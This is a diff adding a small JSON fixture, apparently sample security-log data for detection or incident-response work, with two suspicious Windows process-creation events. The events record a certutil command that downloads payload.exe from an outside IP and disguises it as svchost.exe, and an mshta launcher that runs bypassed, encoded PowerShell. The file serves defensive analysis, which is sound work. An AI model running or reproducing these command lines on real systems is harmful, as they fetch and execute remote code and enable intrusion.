@@ -1,0 +1,20 @@
+{
+  "suspicious_processes": [
+    {
+      "event_id": 4688,
+      "time": "2024-01-14T03:15:00Z",
+      "process": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://185.220.101.42/payload.exe C:\\Windows\\Temp\\svchost.exe",
+      "parent": "cmd.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "event_id": 4688,
+      "time": "2024-01-14T03:16:00Z",
+      "process": "mshta.exe",
+      "command_line": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -e JABj...\"\"\")",
+      "parent": "explorer.exe",
+      "user": "admin"
+    }
+  ]
+}
